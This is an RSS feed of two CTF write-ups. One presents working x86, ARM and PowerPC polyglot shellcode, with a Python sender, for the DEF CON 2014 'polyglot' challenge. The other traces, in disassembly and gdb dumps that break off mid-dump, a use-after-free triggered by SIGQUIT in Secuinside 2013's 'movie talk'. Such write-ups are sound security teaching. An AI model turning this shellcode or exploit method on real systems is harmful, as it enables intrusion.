<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
    <title>RealJenius.com - Category: ctf - clgt crew</title>
   
   <link>http://realjenius.com</link>
   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
   <language>en-us</language>
   <managingEditor>R.J. Lorimer</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
  <title>[defcon 2014 quals] polyglot</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/uncategorized/2014/05/22/defcon-2014-polyglot.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2014-05-22T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/uncategorized/2014/05/22/defcon-2014-polyglot.html</guid>
  <description><![CDATA[
     <p>Challenge was getting 0×1000 bytes from socket, and executing it following these rules (all shellcodes and codes are at the end of this writeup):</p>

<pre class="brush: plain; title: ; notranslate" title="">- all general purpose registers are 0
- stack is at 0x42000000
- pc    is at 0x41000000

</pre>

<p>All binaries:<br />
<strong>x86</strong> : <a href="http://deroko.phearless.org/polyglot/polyglot_9d64fa98df6ee55e1a5baf0a170d3367">polyglot_9d64fa98df6ee55e1a5baf0a170d3367</a><br />
<strong>armel</strong> : <a href="http://deroko.phearless.org/polyglot/polyglot_6a3875ce36a55889427542903cd43893">polyglot_6a3875ce36a55889427542903cd43893</a><br />
<strong>armeb</strong> : <a href="http://deroko.phearless.org/polyglot/polyglot_c0e7a26d7ce539efbecc970c154de844">polyglot_c0e7a26d7ce539efbecc970c154de844</a><br />
<strong>PowerPC</strong>: <a href="http://deroko.phearless.org/polyglot/polyglot_5b78585342a3c116aebb5a9b45e88836">polyglot_5b78585342a3c116aebb5a9b45e88836</a></p>

<p><strong>Our shellcode should read /flag and output it to stdout</strong>. Very simple? I thought that there is some filtering for shellcode, but that didn’t happen. Only problem I’ve encountered was with size of send buffer. Don’t know why, but seemed that my system wasn’t sending all 0×1000 bytes in one run, which gave me some headache latter on. First shellcode to execute is x86. You may see this by connecting to the server, and it will grant you with this message (after we send password to the server given to us by organizer: <strong>w0rk_tHaT_tAlEnTeD_t0nGu3</strong>).</p>

<pre class="brush: plain; title: ; notranslate" title="">----------------------------
Give me shellcode.  You have up to 0x1000 bytes.  All GPRs are 0.  PC is 0x41000000.  SP is 0x42000000.

Throwing shellcode against linux26-x86.(http://services.2014.shallweplayaga.me/polyglot_9d64fa98df6ee55e1a5baf0a170d3367)
----------------------------

</pre>

<p>This was quite simple.</p>

<p>Next one on the line was <strong>armel</strong>, so our shellcode has to be compatible with <strong>x86</strong> and <strong>armel</strong>. Simple, we just find B instruction and branch over x86 shellcode. For writing this shellcode I used <strong>raspbian</strong> in <strong>qemu</strong>. Once this shellcode was executed, next one was <strong>armeb</strong>, eg. same shell code but differently stored in a big endian. Now comes funny part, finding 2 instructions which are do nothing for armel and B for armeb and vice verse. For this purpose I’ve experimented with branch instructions and after a bit found good combination:</p>

<pre class="brush: plain; title: ; notranslate" title="">dd      0xEB0000E0
       dd      0xE00000EB

</pre>

<p>Which, tnx to capstone comes to be:</p>

<pre class="brush: plain; title: ; notranslate" title="">0x00000000: bl #0x380
0x00000004: and r0, r0, fp, ror #1

</pre>

<p>Very good, at this offset I had:</p>

<pre class="brush: plain; title: ; notranslate" title="">ldr    pc, [pc, #4]        &lt;--- for  armel
      ldr    pc, [pc, #4]        &lt;--- form armeb
      dd    address_of_armel_shellcode
      dd    address_of_armeb_shellcode

</pre>

<p>Here I figured that my shellcode doesn’t get transfered as a whole, as my original first ARM instructions were going to 0x41000Fxx where I had LDR PC, [PC, #4]. Also while playing with ARM instructions in IDA, I’ve noticed that IDA showed some ARM <strong>BEQ</strong> instructions as <strong>B</strong> which was wrong. From this point on I’ve used only <strong>capstone</strong> as this beq/b wrong translation in IDA gave me also some headache.</p>

<p>Now comes 4th stage, and that was the ugliest one: <strong>PowerPC</strong> . I try to avoid any possible shellcode in the wild, and prefer to write my own always. For this, due to whatever reason qemu which comes with ubuntu 14.04 couldn’t run PowerPC image which I’ve located here:<br />
<a href="http://people.debian.org/~aurel32/qemu/powerpc/">http://people.debian.org/~aurel32/qemu/powerpc/</a> (you can also get armel and amrhf from this link)</p>

<p>No problem, downloaded qemu 2.0.0 and recompiled and it worked. Time to start writing my code. Of course, gdb is very very useless without any hookstop, so for this purpose I wrote simple  .gdbinit to help me develop this shellcode:</p>

<pre class="brush: plain; title: ; notranslate" title="">define hook-stop
        printf "---------------------------------------------------------------n"
        printf "r0 : 0x%.08X r1 : 0x%.08X r2 : 0x%.08X r3 : 0x%.08Xn", $r0, $r1, $r2, $r3
        printf "r4 : 0x%.08X r5 : 0x%.08X r6 : 0x%.08X r7 : 0x%.08Xn", $r4, $r5, $r6, $r7
        printf "---------------------------------------------------------------n"
        x/10i   $pc
end

</pre>

<p>We are ready to go with simple test. One thing about PowerPC syntax is that registers in assembly are represented as 0-31, so it’s sometimes hard to make difference and notice errors, which puzzled  me a lot. Here is PowerPC code<br />
<strong>pc</strong>           is set at 0×41000000<br />
<strong>r1</strong> is sp and is set at 0×42000000</p>

<p><strong>syscall number is passed in r0</strong>, and <strong>arguments follow in r3,r4 etc.</strong> <strong>return values are stored in r3</strong>:</p>

<pre class="brush: plain; title: ; notranslate" title="">addi    1, 1, 0x400             //increment stack a bit (just in case)
        xor     30, 30, 30              //wipe r30 just in case, as junk opcode modifies it
        b       __flag_address          //jmp/call simulation in PowerPC
__goback:
        xor     4,4,4
        mfspr   3, 8                    //get /flag into r3
        li      0, 5                    //load r0 with 5
        sc                              //system call (funny name of sc instruction)

        //read
        xor     4, 4, 4                 //xor r4, r4, r4
        addi    4, 1, 0x0               //mov r1 to r4 &lt;--- add is used to simulate mov
        xor     5, 5, 5                 //do same for r5 as we did for r4
        addi    5, 5, 0x64              //set r5 to 0x64, maybe better would be li... but who cares...
        //r3 has fd
        li      0, 3                    //r0 = read syscall (r3 is already set to fd)
        sc

        //write
        xor     5, 5, 5                 //r5 to 0
        addi    5 ,5, 0x64              //r5 to 0x64
        xor     4, 4, 4
        addi    4, 1, 0
        xor     3, 3, 3                 //r3 = 0
        addi    3, 3, 1                 //r3 = 1 (stdout)
        li      0, 4                    //r0 = 4 (write)
        sc                              //sc

        xor     3, 3, 3
        //exit
        li      0, 1
        sc

__flag_address:
        bl      __goback
flag:   .ascii "/flag"
</pre>

<p>My biggest error came in <strong>addi 4,1,0</strong> as I didn’t use <strong>addi</strong> but I’ve used <strong>add</strong>, in this great syntax it assembles to: <strong>add r4, r1, r0</strong> — r0 + SP and I just wanted to do <strong>addi r4, r1, 0</strong> (easy way to move data from one register to another…). This took some time to figure, and was really really annoying part, as shellcode worked on their binary running on my PowerPC so it was hard to spot error. One way for me to test PowerPC (before I’ve noticed addi add error in shellcode) was to use <strong>/flags</strong> instead of <strong>/flag</strong> which would on open block server. I have no idea what /flags was on remote sysem, but server would hang and would not send any error back (no socket close, no reply, nothing, just idle state).</p>

<p>Now comes part where I need to put B to PowerPC and to skip over ARM code, and make it x86 compatible. This tooks some time, as I needed such instruction (and I found one) which is perfectly skipped by arm, but x86 wouldn’t like it (no matter what) as B in PowerPC starts with 0x4x which translates to inc/dec registers on x86. Next byte after 0x4x must be 0×0 so we don’t jump far (well it makes conditional jmp on PowerPC but I didn’t want to waste too much time on learning full PowerPC assembly)</p>

<p>One good solution which worked (but tnx to add r4, r1, r0) I thought that this time I had same problem like in arm, that my computer didn’t send enough data:</p>

<pre class="brush: plain; title: ; notranslate" title="">code = "";
code += "x40x00x04x05";
code += "x02x00x00x42";

</pre>

<p>which translates to brilliant opcodes which are properly executed:</p>

<pre class="brush: plain; title: ; notranslate" title="">ARM:
0x00000000: streq r0, [r4, #-0x40]      &lt;--- armel (doesn't store anything so it's good to go)
0x00000004: andmi r0, r0, #2            &lt;--- armel (who cares...)
0x00000008: andmi r0, r0, r5, lsl #8    &lt;--- armeb
0x0000000c: andeq r0, r0, #0x42         &lt;--- armeb
PPC:
0x00000000: bcl 0, 0, .+0x404           &lt;--- excelent b to 0x404 for PowerPC
x86:
0x00000000: inc eax
0x00000001: add byte ptr [eax + 0x42000002], al &lt;--- brilliant write to who cares at stack

</pre>

<p>But I abandoned this as I thought that 0×404 was wrong (eg. not all data was transferred ) So tnx to x86 instructions set where we can have arbitrary instruction size, I’ve decided to use next approach.</p>

<p>Next step was, lets make dummy instruction which will do <strong>jmp __overPPC_arm</strong> and be almost like NOP for all other platforms. One pair of 2 byte instructions came to my mind. <strong>xor eax, eax/jz __x86 shellcode</strong>, and many other options here (eg. stc/jb, clc/jnb, inc eax/jns, dec eax/js, test eax,eax/jz, test esp, esp/jnz, cmp/or/sub, endless options.):</p>

<pre class="brush: plain; title: ; notranslate" title="">code = "";
code += "x33xc0x74x10";            #didn't put it after for armeb as bswaped
                                                            #ppc doesn't give right results. but it's
                                                            #do nothing for armeb
code += "x48x00x01x00";            #to test for armel
code += "x00x01x00x48";            #to test for armeb

and capstone gives us back:


ARM:
0x00000000: rsbsne ip, r4, r3, lsr r0           #x86 code
0x00000004: andeq r0, r1, r8, asr #32        #B for PPC as armel
0x00000008: stmdami r0, {r8}                     #B for PPC as armeb
PPC:
0x00000000: addic r30, r0, 0x7410            #x86 code
0x00000004: b .+0x100                             #our bracnh looks good...

</pre>

<p>Now we place PowerPPC code at 0×104 offset and there we go. Running my assembly code against server gives back:</p>

<pre class="brush: plain; title: ; notranslate" title="">---------------------------------------------------------------------------------------------------------
xxx# python sendshellcode.py
Password:


Give me shellcode.  You have up to 0x1000 bytes.  All GPRs are 0.  PC is 0x41000000.  SP is 0x42000000.

Throwing shellcode against linux26-x86.(http://services.2014.shallweplayaga.me/polyglot_9d64fa98df6ee55e1a5baf0a170d3367)

Throwing shellcode against linux26-armel.(http://services.2014.shallweplayaga.me/polyglot_6a3875ce36a55889427542903cd43893)

Throwing shellcode against linux26-armeb.(http://services.2014.shallweplayaga.me/polyglot_c0e7a26d7ce539efbecc970c154de844)

Throwing shellcode against linux26-ppc.(http://services.2014.shallweplayaga.me/polyglot_5b78585342a3c116aebb5a9b45e88836)

The flag is: I can tie a knot in a cherry stem

xxx#
---------------------------------------------------------------------------------------------------------

</pre>

<p>And we got the flag : ** I can tie a knot in a cherry stem**</p>

<p><strong>ARM shellcode:</strong></p>

<pre class="brush: plain; title: ; notranslate" title="">shellcode:
        add     sp, #100
        add     sp, #100
        add     sp, #100
        add     sp, #100

        adr     r0, flag
        mov     r1, 0
        svc     0x900005
        mov     r2, #100
        mov     r1, sp
        sub     r1, #100
        svc     0x900003

        mov     r2, #100
        mov     r1, sp
        sub     r1, #100
        mov     r0, 1
        svc     0x900004

        mov     r0, 0
        svc     0x900001
flag:

</pre>

<p>Final shellcode which shold be compield with nasm as : **nasm -fbin sc.asm -o sc.bin **</p>

<pre class="brush: plain; title: ; notranslate" title="">[BITS 32]


                        db	0x33, 0xc0, 0x74, 0x10
                        db	0x48, 0x00, 0x01, 0x00


                        dd      0xEB0000E0
                        dd      0xE00000EB

__x86_shellcode:        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        add    esp, 0xFFC
                        call   __delta
__delta:                pop    ebp
                        sub    ebp, __delta
                        xor    ecx, ecx
                        lea    ebx, [ebp+flag]
                        mov    eax, 0x05
                        int    0x80
                        mov    esi, eax

                        mov    edi, esp
                        sub    edi, 0x200
                        xor    eax, eax
                        cld
                        mov    ecx, 0x200
                        rep    stosb
                        mov    edi, esp
                        sub    edi, 0x200

                        mov    edx, 80
                        mov    ecx, edi
                        mov    ebx, esi
                        mov    eax, 3
                        int    0x80

                        mov    edx, 80
                        mov    ecx, edi
                        xor    ebx, ebx
                        mov    eax, ebx
                        inc    ebx
                        mov    eax, 4
                        int    0x80
                        xor    ebx, ebx
                        mov    eax, 1
                        int    0x80


flag:                   db      "/flag", 0
buffer:
                        times 0x104 - ($-$$) db 0xFF
                        dd       0x00042138
                        dd       0x78F2DE7F
                        dd       0x58000048
                        dd       0x7822847C
                        dd       0xA602687C
                        dd       0x05000038
                        dd       0x02000044
                        dd       0x7822847C
                        dd       0x00008138
                        dd       0x782AA57C
                        dd       0x6400A538
                        dd       0x03000038
                        dd       0x02000044
                        dd       0x782AA57C
                        dd       0x6400A538
                        dd       0x7822847C
                        dd       0x00008138
                        dd       0x781A637C
                        dd       0x01006338
                        dd       0x04000038
                        dd       0x02000044
                        dd       0x781A637C
                        dd       0x01000038
                        dd       0x02000044
                        dd       0xADFFFF4B
                        db       "/flag", 0
                        times 0x200 - ($-$$) db 0xFF
                        align	4
                        ;arm shellcode -&gt; open in IDA and CPU set to ARM -&gt; goto 0x200 (little endian)
                        dd
                        dd       0xE28DD064
                        dd       0xE28DD064
                        dd       0xE28DD064
                        dd       0xE28DD064
                        dd       0xE28F0030
                        dd       0xE3A01000
                        dd       0xEF900005
                        dd       0xE3A02064
                        dd       0xE1A0100D
                        dd       0xE2411064
                        dd       0xEF900003
                        dd       0xE3A02064
                        dd       0xE1A0100D
                        dd       0xE2411064
                        dd       0xE3A00001
                        dd       0xEF900004
                        dd       0xE3A00000
                        dd       0xEF900001
                        db       "/flag", 0


                        times 0x300 - ($-$$) db 0xFF
                        align    4
                        ;big endian arm shellcode -&gt; same procedure like for previos ARM but select big endian arm
                        ;shellcodes are exactly them same with change that this one is convereted to big-endian
                        dd       0x64D08DE2
                        dd       0x64D08DE2
                        dd       0x64D08DE2
                        dd       0x64D08DE2
                        dd       0x30008FE2
                        dd       0x0010A0E3
                        dd       0x050090EF
                        dd       0x6420A0E3
                        dd       0x0D10A0E1
                        dd       0x641041E2
                        dd       0x030090EF
                        dd       0x6420A0E3
                        dd       0x0D10A0E1
                        dd       0x641041E2
                        dd       0x0100A0E3
                        dd       0x040090EF
                        dd       0x0000A0E3
                        dd       0x010090EF
                        db       "/flag", 0

                        ;LDR    pc, [pc, #4]		little endian
                        ;LDR    pc, [pc, #4]	 	big endian
                        times    0x390 - ($-$$) db 0xFF
                        dd       0xE59FF000
                        dd       0x00F09FE5
                        dd       0x41000200
                        dd       0x00030041


</pre>

<p><strong>Generic python code for CTF when user input is required:</strong></p>

<pre class="brush: plain; title: ; notranslate" title="">SELECT_TIMEOUT = 2;

def	callmefunc(sock, buff):
	print(buff);
	if "Password" in buff:
		sock.send("w0rk_tHaT_tAlEnTeD_t0nGu3n");
	if "Give me shellcode" in buff:
		f = open("sc.bin", "rb");
		buff = f.read();
		sock.send(buff);
	return 0;

def	recv_all(sock, callme):
	buff = "";
	while True:
		rlist = select.select([sock,], [], [], SELECT_TIMEOUT)[0];
		if len(rlist) == 0: continue;
		try:
			buff = sock.recv(0x1000);
		except:
			break;
		if not buff: break;
		ret = callme(sock, buff);
		if ret != 0:
			sock.close();
			return;

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
sock.connect(("polyglot_9d64fa98df6ee55e1a5baf0a170d3367.2014.shallweplayaga.me", 30000));

recv_all(sock, callmefunc);

exit();


</pre>

<p><strong>capstone python code for testing</strong></p>

<pre class="brush: plain; title: ; notranslate" title="">import capstone


#code =  "xE0x00x00xEB";
#code += "xEBx00x00xe0";
code = "";
code += "x33xc0x74x10";
code += "x48x00x01x00";
code += "x00x01x00x48";

print("ARM:")
md = capstone.Cs(capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM);
data = md.disasm(code, 0x0);
for insn in data:
	print("0x%.08x: %s %s" % (insn.address, insn.mnemonic, insn.op_str));


print("PPC:");
md = capstone.Cs(capstone.CS_ARCH_PPC, capstone.CS_MODE_BIG_ENDIAN);
data = md.disasm(code, 0x0);
for insn in data:
	print("0x%.08x: %s %s" % (insn.address, insn.mnemonic, insn.op_str));


print("x86:");
md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32);
data = md.disasm(code, 0x0);
for insn in data:
        print("0x%.08x: %s %s" % (insn.address, insn.mnemonic, insn.op_str));
</pre>


  ]]></description>
</item>

	<item>
  <title>[Secuinside CTF 2013] movie talk</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/30/secuinside-ctf-2013-movie-talk.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2013-05-30T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/30/secuinside-ctf-2013-movie-talk.html</guid>
  <description><![CDATA[
     <p>Challenge itself is very interesting, as we have typical use-after-free problem. It’s running on Ubuntu 13.04 with NX + ASLR.</p>

<p>When we run challenge it gives us message as :</p>

<pre class="brush: plain; title: ; notranslate" title="">######################################
#                                    #
#   Welcome to the movie talk show   #
#                                    #
######################################

1. movie addition
2. movie deletion
3. my movie list
4. quit
:
</pre>

<p>movie addition is very straight forward:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:080489F4                 mov     dword ptr [esp], 14h ; size
.text:080489FB                 call    _malloc
.text:08048A00                 mov     [ebp+movie_array], eax
.text:08048A03                 cmp     [ebp+movie_array], 0
.text:08048A07                 jnz     short __mem_alloc_ok
</pre>

<p>Alloc struct to hold movie_list which is described like this:</p>

<pre class="brush: plain; title: ; notranslate" title="">00000000 movie_list      struc ; (sizeof=0x14)
00000000 fn_moviedetails dd ?
00000004 movie_name      dd ?
00000008 movie_id        dd ?
0000000C movie_rating    dd ?
00000010 movie_rate      dd ?
</pre>

<p>Than we have small sleep of 2 seconds here:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:0804880A ; signed int __cdecl get_film_name_rating(movie_list a1)
.text:0804880A get_film_name_rating proc near
.text:0804880A                 push    ebp
.text:0804880B                 mov     ebp, esp
.text:0804880D                 sub     esp, 58h
.text:08048810                 mov     eax, [ebp+movie_array.fn_moviedetails]
.text:08048813                 mov     [ebp+l_movie_array], eax
.text:08048816                 mov     eax, large gs:14h
.text:0804881C                 mov     [ebp+cookie], eax
.text:0804881F                 xor     eax, eax
.text:08048821                 mov     dword ptr [esp], 2 ; seconds
.text:08048828                 call    _sleep   &lt;--- very important here is this sleep remember it for later
</pre>

<p>than movie name is obtained from input:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:0804882D                 mov     dword ptr [esp], offset aMovieName ; "movie name: "
.text:08048834                 call    _printf
.text:08048839                 mov     eax, ds:stdin
.text:0804883E                 mov     [esp+8], eax    ; stream
.text:08048842                 mov     dword ptr [esp+4], 1Eh ; n
.text:0804884A                 lea     eax, [ebp+nptr]
.text:0804884D                 mov     [esp], eax      ; s
.text:08048850                 call    _fgets
.text:08048855                 lea     eax, [ebp+nptr]
.text:08048858                 mov     [esp], eax      ; s
.text:0804885B                 call    _strlen
.text:08048860                 mov     [ebp+n], eax
.text:08048863                 mov     eax, [ebp+n]
.text:08048866                 add     eax, 1
.text:08048869                 mov     [esp], eax      ; size
.text:0804886C                 call    _malloc          &lt;--- malloc (also very important)
</pre>

<p>Other code is not important, as it reads movie rating, which can be in range from 0-101 (although code says movie rating 1-100), not really important. Also application asks for movie_rate which can be in range:</p>

<pre class="brush: plain; title: ; notranslate" title="">mov     dword ptr [esp], offset aFilmRate012151 ; "film rate [0,12,15,19]: "
</pre>

<p>Than ID of movie is assigned which is it’s current place in array of movies, and not actual ID, and function to display movie is stored also as part of movie_list struct.</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048989                 mov     edx, ds:g_count_of_array
.text:0804898F                 mov     eax, [ebp+l_movie_array]
.text:08048992                 mov     [eax+movie_list.movie_id], edx
.text:08048995                 mov     eax, [ebp+l_movie_array]
.text:08048998                 mov     [eax+movie_list.fn_moviedetails], offset PutMovieDetails
.text:0804899E                 mov     eax, 1
</pre>

<p>We noticed first that we can assign random ID to the movie, buy deleting them, and were looking at this code first. For example, when deleting movie this code is used to get it’s index:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048AFB                 call    _fgets
.text:08048B00                 movzx   eax, [ebp+s]
.text:08048B04                 movsx   eax, al
.text:08048B07                 sub     eax, 31h
</pre>

<p>Obviously, if we enter 10 it will always delete movie at index 0, as it considers only one char, thus we were looking where we can confuse program to reuse wrong index. Not good… nothing found. Code seemed like very well written, without errors. Every movie delete would fill gaps in array, thus code really seemed bullet-proof.</p>

<p>When code is about to exit, there was one function called, which would free whole array of movies:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048C3B                 push    ebp
.text:08048C3C                 mov     ebp, esp
.text:08048C3E                 sub     esp, 28h
.text:08048C41                 mov     [ebp+index], 0
.text:08048C48                 jmp     short loc_8048C94
.text:08048C4A __loop_delete:
.text:08048C4A                 mov     eax, [ebp+index]
.text:08048C4D                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C54                 test    eax, eax
.text:08048C56                 jz      short __no_movie
.text:08048C58                 mov     eax, [ebp+index]
.text:08048C5B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C62                 mov     eax, [eax+movie_list.movie_name]
.text:08048C65                 test    eax, eax
.text:08048C67                 jz      short __no_movie
.text:08048C69                 mov     eax, [ebp+index]
.text:08048C6C                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C73                 mov     eax, [eax+movie_list.movie_name]
.text:08048C76                 mov     [esp], eax      ; ptr
.text:08048C79                 call    _free
.text:08048C7E                 mov     eax, [ebp+index]
.text:08048C81                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C88                 mov     [esp], eax      ; ptr
.text:08048C8B                 call    _free
.text:08048C90
.text:08048C90 __no_movie:
.text:08048C90                 add     [ebp+index], 1
.text:08048C94
.text:08048C94 loc_8048C94:
.text:08048C94                 cmp     [ebp+index], 9
.text:08048C98                 jbe     short __loop_delete
.text:08048C9A                 leave
.text:08048C9B                 ret
</pre>

<p>This function, would give us full control over arrays of movies, as we could free movies, and reuse freed memory to be used later during printing movie:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048BFA                 mov     eax, [ebp+index]
.text:08048BFD                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C04                 test    eax, eax
.text:08048C06                 jz      short loc_8048C23
.text:08048C08                 mov     eax, [ebp+index]
.text:08048C0B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C12                 mov     eax, [eax+movie_list.fn_moviedetails]
.text:08048C14                 mov     edx, [ebp+index]
.text:08048C17                 mov     edx, ds:g_movie_array.fn_moviedetails[edx*4]
.text:08048C1E                 mov     [esp], edx
.text:08048C21                 call    eax      &lt;-- if we free we could reuse movie.fn_moviedetails
 to execute our code.
</pre>

<p>Than we saw something interesting:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048CA5                 mov     dword ptr [esp+4], offset handler ; handler
.text:08048CAD                 mov     dword ptr [esp], 3 ; sig
.text:08048CB4                 call    _signal         ; SIGQUIT
</pre>

<p>We can invoke free on all lists by sending signal 3 to the process, so we can actually free structs. When we run into it, in a few sec we had working poc:** @__suto** replied on skype : 0×41414141 , and at the same time I replied with 0×61616161 so we knew we have eip control. Now I’ll try to explain how we got to this point. We found also way to leak address of puts from GOT thus we can recalculate system address and call system(“cat key.txt”), as this point we handed POC to <strong>xichzo</strong> which soon got key, and we got 550 <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> </p>

<p>Leaking address is something we didn’t manage to do, as application can’t be piped to receive data in real time, eg. pipe is flushed only when process dies, thus even if we leak address it wouldn’t be too much use, as on next run address would be different. So here we go for explanation of our use-after-free exploit:</p>

<p>Break after 1st malloc when adding movie:</p>

<pre class="brush: plain; title: ; notranslate" title="">--------------------------------------------------------------------------[regs]
 EAX: 0x0804C008  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C008  o d I t S z a P c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF178  ESP: 0xBFFFF150  EIP: 0x08048A00
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048a00:    mov    DWORD PTR [ebp-0x10],eax
 0x8048a03:    cmp    DWORD PTR [ebp-0x10],0x0
 0x8048a07:    jne    0x8048a15
 0x8048a09:    mov    DWORD PTR [esp],0x8048e93
 0x8048a10:    call   0x80486fc
 0x8048a15:    mov    eax,DWORD PTR [ebp-0x10]
 0x8048a18:    mov    DWORD PTR [esp],eax
 0x8048a1b:    call   0x804880a
--------------------------------------------------------------------------------

Breakpoint 1, 0x08048a00 in ?? ()
</pre>

<p>Now comes sleep of 2 seconds, and we allocate 1st movie. This is very important to look at memory layout once 1st movie is added:</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ dd 0x804c008
[0x007B:0x0804C008]-------------------------------------------------------[data]
0x0804C008 : AA 87 04 08 20 C0 04 08 - 01 00 00 00 00 00 00 00 .... ...........
0x0804C018 : 00 00 00 00 19 00 00 00 - 61 61 61 61 61 61 61 61 ........aaaaaaaa
0x0804C028 : 61 61 61 61 61 61 0A 00 - 00 00 00 00 D1 0F 02 00 aaaaaa..........
0x0804C038 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
0x0804C048 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
0x0804C058 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
</pre>

<p>So movie_list is:</p>

<pre class="brush: plain; title: ; notranslate" title="">00000000 fn_moviedetails        0x080487AA      &lt;--- display function
00000004 movie_name             0x0804C020      &lt;--- movie name
00000008 movie_id               0x1             &lt;--- index in global array of movies (not important)
0000000C movie_rating           0x0             &lt;--- dummy value which we set to be 0
00000010 movie_rate             0x0             &lt;--- dummy value which we set to be 0
</pre>

<p>Lets observe memory when we allocate 2nd movie_list:</p>

<pre class="brush: plain; title: ; notranslate" title="">EAX = 0x0804C038        &lt;--- right after our movie name string.
</pre>

<p>Now when process goes into sleep(2) at :</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048821                 mov     dword ptr [esp], 2 ; seconds
.text:08048828                 call    _sleep
</pre>

<p>We will fire killall -3 movie_talk to free memory occupied by 1st movie_list, and malloc for movie_name will be allocated here. To make it easier for debugging we can cheat by increasing timer to 32 sec:</p>

<pre class="brush: plain; title: ; notranslate" title="">--------------------------------------------------------------------------[regs]
 EAX: 0x00000000  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C038  o d I t s Z a P c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF148  ESP: 0xBFFFF0F0  EIP: 0x08048828
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048828:    call   0x8048550 &lt;sleep@plt&gt;
 0x804882d:    mov    DWORD PTR [esp],0x8048e86
 0x8048834:    call   0x8048500 &lt;printf@plt&gt;
 0x8048839:    mov    eax,ds:0x804b064
 0x804883e:    mov    DWORD PTR [esp+0x8],eax
 0x8048842:    mov    DWORD PTR [esp+0x4],0x1e
 0x804884a:    lea    eax,[ebp-0x2a]
 0x804884d:    mov    DWORD PTR [esp],eax
--------------------------------------------------------------------------------
0x08048828 in ?? ()
gdb$ break *0x804882d
Breakpoint 15 at 0x804882d
gdb$ set *(unsigned int *)$esp = 0x20
gdb$

...
=&gt; 0xb7fdd424 &lt;__kernel_vsyscall+16&gt;:    pop    ebp
 0xb7fdd425 &lt;__kernel_vsyscall+17&gt;:    pop    edx
 0xb7fdd426 &lt;__kernel_vsyscall+18&gt;:    pop    ecx
 0xb7fdd427 &lt;__kernel_vsyscall+19&gt;:    ret
</pre>

<p>Signal fired, and we can continue:</p>

<pre class="brush: plain; title: ; notranslate" title="">=&gt; 0x804882d:    mov    DWORD PTR [esp],0x8048e86
 0x8048834:    call   0x8048500 &lt;printf@plt&gt;
 </pre>

<p>Now watch for malloc:</p>

<pre class="brush: plain; title: ; notranslate" title="">--------------------------------------------------------------------------[regs]
 EAX: 0x0804C008  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C008  o d I t S z a P c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF148  ESP: 0xBFFFF0F0  EIP: 0x08048871
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048871:    mov    edx,eax
 0x8048873:    mov    eax,DWORD PTR [ebp-0x3c]
 0x8048876:    mov    DWORD PTR [eax+0x4],edx
 0x8048879:    mov    eax,DWORD PTR [ebp-0x3c]
 0x804887c:    mov    eax,DWORD PTR [eax+0x4]
 0x804887f:    test   eax,eax
 0x8048881:    jne    0x804888f
 0x8048883:    mov    DWORD PTR [esp],0x8048e93
--------------------------------------------------------------------------------

Temporary breakpoint 20, 0x08048871 in ?? ()&lt;/pre&gt;
EAX = 0x804C008 &lt;--- where we had 1st movie list, thus we control movie_list and
function pointer at movie_list.fn_moviedetails
</pre>

<p>Lets look at memory after input is copied there:</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ dd 0x804c008
[0x007B:0x0804C008]-------------------------------------------------------[data]
0x0804C008 : 61 61 61 61 61 61 61 61 - 61 61 61 61 61 61 61 61 aaaaaaaaaaaaaaaa
0x0804C018 : 0A 00 00 00 19 00 00 00 - 00 00 00 00 61 61 61 61 ............aaaa
0x0804C028 : 61 61 61 61 61 61 61 61 - 0A 00 00 00 19 00 00 00 aaaaaaaa........
0x0804C038 : 00 00 00 00 08 C0 04 08 - 00 00 00 00 00 00 00 00 ................
0x0804C048 : 00 00 00 00 B9 0F 02 00 - 00 00 00 00 00 00 00 00 ................
